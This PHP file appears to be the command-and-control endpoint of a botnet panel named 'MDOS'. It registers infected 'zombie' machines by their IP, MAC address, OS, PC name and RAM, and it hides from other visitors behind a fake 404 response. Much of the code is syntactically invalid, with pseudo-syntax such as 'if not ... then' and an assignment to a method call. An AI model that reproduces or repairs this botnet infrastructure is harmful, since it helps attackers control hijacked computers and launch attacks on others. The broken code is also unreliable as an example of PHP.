<?php
include dirname(__FILE__).'/../../api/core.php';
include dirname(__FILE__).'/../../static/config.php';
$MDOS = new MDOS;
if isset ($_POST ['req']) then {
	$req = $_POST ['req'];
	switch ($req) {
		case "connect":
			$lang = $_GET['lang'];
			$localgateway = $_GET['localgateway'];
			$os = $_GET['os'];
			$macadr = $_GET['macadr'];
			$archetype = $_GET['archetype'];
			$pcname = $_GET['pcname'];
			$ram = $_GET['ram'];
			$ip = ($MDOS -> RetrieveIP());
			$sid = $_GET['sid'];
			if ((isset ($lang)) and (isset ($localgateway)) and (isset($os)) and (isset($macadr)) and (isset($archetype)) and (isset($pcname)) and (isset ($ram)) and (isset ($sid))) {
				if ($MDOS -> SecureCheckZombSID($_GET['sid'])) {
					if not ($MDOS -> ZombExists ($macadr)) then {
						$MDOS -> ZombRegister ($ip, $lang, $localgateway, $os, $macadr, $archetype, $pcname, $ram, $sid, "connected");
						exit;
					}
					else {
						$MDOS -> ZombGetData ($macadr) = $zombdata;
						exit;
					}
				}
				else {
					$MDOS -> WriteLog (($MDOS -> RetrieveIP()), '#2', 'CSRF MDOS attack attempt. (zombie client can not give a bad secure connexion id.)');
					exit;
				}
			}
			else {
				$MDOS -> WriteLog (($MDOS -> RetrieveIP()), '#2', 'CSRF MDOS attack attempt. (zombie client can not make any registration error.)');
				exit;
			}
		break;
	}
}
else {
	header("HTTP/1.0 404 Not Found");
	exit;
}
?>